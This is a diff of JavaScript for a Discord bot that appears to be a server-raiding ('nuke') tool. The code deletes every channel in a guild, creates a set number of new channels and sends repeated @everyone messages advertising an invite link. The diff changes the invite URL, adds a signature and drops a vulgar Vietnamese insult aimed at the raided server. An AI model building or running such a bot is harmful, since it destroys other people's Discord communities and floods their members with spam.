@@ -143,7 +143,7 @@ await sendCommandLog(interaction);
     type: ChannelType.GuildText
   });
 
-  await controlChannel.send("⚠️ @everyone Join: https://discord.gg/P9yeTvwKjB");
+  await controlChannel.send("⚠️ @everyone Join: https://discord.gg/7yAeEGJwM7|bot by phamminhnhat__ ");
 
   /* ===== XOÁ CHANNEL ===== */
   for (const ch of [...guild.channels.cache.values()]) {
@@ -158,7 +158,7 @@ await sendCommandLog(interaction);
 
 
 
-  await controlChannel.send("@everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");
+  await controlChannel.send("@everyone ⚡ @everyone Join: https://discord.gg/7yAeEGJwM7");
 
   /* ===== TẠO KÊNH + GỬI TIN ===== */
   for (let i = 0; i < CREATE_COUNT; i++) {
@@ -170,13 +170,13 @@ await sendCommandLog(interaction);
         });
 
         for (let k = 0; k < MSG_PER_CHANNEL; k++) {
-          await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+          await ch.send("@everyone 🚀 Join: https://discord.gg/7yAeEGJwM7");
         }
       } catch {}
     });
   }
 
-  await controlChannel.send("Server như cái dái chó kkkk. @everyone join: https://discord.gg/P9yeTvwKjB");
+  await controlChannel.send(" @everyone Join: https://discord.gg/7yAeEGJwM7");
 });
 
 client.login(process.env.BOT_TOKEN);
